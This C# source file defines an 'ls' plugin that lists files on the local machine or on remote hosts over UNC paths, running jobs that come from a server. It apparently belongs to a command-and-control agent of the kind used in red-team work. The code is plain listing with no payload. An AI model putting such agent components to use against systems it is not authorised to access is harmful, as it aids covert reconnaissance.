using System.Net;
using Agent.Interfaces;
using Agent.Utilities;
using Agent.Models;
using ls;
using System.Text.Json;

namespace Agent
{
    public class Plugin : IPlugin
    {

        public string Name => "ls";
        private IMessageManager messageManager { get; set; }
        private ITokenManager tokenManager { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.messageManager = messageManager;
            this.tokenManager = tokenManager;
        }
        public async Task Execute(ServerJob job)
        {
            LsArgs args = JsonSerializer.Deserialize<LsArgs>(job.task.parameters);


            if(args is null || !args.Validate())
            {
                await messageManager.Write("Failed to parse arguments", job.task.id, true, "error");
                return;
            }

            if (string.IsNullOrEmpty(args.host) || args.host.Equals(Dns.GetHostName(), StringComparison.OrdinalIgnoreCase))
            {
                await messageManager.AddResponse(LocalListing.GetLocalListing(args.path, job.task.id));
            }
            else
            {
                await messageManager.AddResponse(RemoteListing.GetRemoteListing(Path.Join("\\\\" + args.host, args.path), args.host, job.task.id));
            }
        }
    }
}

